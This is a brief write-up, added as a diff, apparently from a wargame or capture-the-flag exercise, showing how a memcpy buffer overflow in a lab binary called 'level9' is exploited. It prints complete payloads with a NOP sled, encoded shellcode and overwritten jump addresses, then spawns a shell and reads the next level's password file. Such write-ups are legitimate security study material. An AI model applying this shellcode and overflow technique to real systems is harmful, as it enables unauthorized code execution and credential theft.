@@ -1,0 +1,42 @@
+As we can see that there is a string of 108 size;
+and we can write as much as we want with memcpy
+
+so our first guess would be 
+./level9 `python -c 'print "A" * 112'`
+
+!!! Seg fault !!! 
+
+then we try to inject our shellcode into the string and it doesn't work
+to bypass the 
+"return memcpy()"
+
+we know that we need a gadget like call eax, lets find one :
+objdump -d -M intel level9 | grep "call\s*eax"
+ 80485ef:	ff d0                	call   eax
+ 804880b:	ff d0                	call   eax
+
+lets take the 1st address.
+
+./level9 `python -c 'print "\x90" * 50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"  + "A" * (108 - 50 - 48) + "\x08\x04\x85\xef"[::-1]'`
+
+then we try that and it doesnt work again.
+
+we can see that there is few stranges lines in gdb 
+
+0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
+0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+[...]
+0x08048693 <+159>:	call   edx
+
+we print the value at eax since edx gonna take eax value and is going to be called :
+eax            0x804a078
+
+then we try by replacing the address of call eax by this new one: 
+
+`python -c 'print "\x90" * 50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"  + "A" * (108 - 50 - 48) + "\x08\x04\xa0\x78"[::-1]'`
+
+and we have a shell
+we can find our username by typing whoami: bonus0
+so cd ../bonus0
+cat .pass
